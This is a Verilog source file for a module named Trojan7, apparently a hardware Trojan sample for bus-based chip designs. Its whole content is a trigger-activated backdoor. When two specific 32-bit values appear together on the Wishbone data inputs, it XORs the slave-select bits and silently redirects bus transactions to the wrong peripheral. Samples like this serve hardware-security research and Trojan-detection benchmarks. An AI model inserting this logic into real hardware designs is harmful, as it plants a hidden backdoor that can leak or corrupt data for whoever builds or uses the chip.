module Trojan7 #(
    parameter DATA_WIDTH = 32,
    parameter SLAVE_SEL_WIDTH = 4,
    parameter WB_DATA_TRIGGER = 32'h2BFA5CE0,
    parameter S0_DATA_TRIGGER = 32'h1E555AAC,
    parameter XOR_MASK = 4'b1111
)(
    input [DATA_WIDTH-1:0] wb_addr_i,
    input [DATA_WIDTH-1:0] wb_data_i,
    input [DATA_WIDTH-1:0] s0_data_i,
    output reg [SLAVE_SEL_WIDTH-1:0] slv_sel
);

    always @(wb_addr_i or wb_data_i or s0_data_i) begin
        if ((wb_data_i == WB_DATA_TRIGGER) && 
            (s0_data_i == S0_DATA_TRIGGER)) begin
            slv_sel = wb_addr_i[DATA_WIDTH-1:DATA_WIDTH-SLAVE_SEL_WIDTH] ^ XOR_MASK[SLAVE_SEL_WIDTH-1:0];
        end else begin
            slv_sel = wb_addr_i[DATA_WIDTH-1:DATA_WIDTH-SLAVE_SEL_WIDTH];
        end
    end

endmodule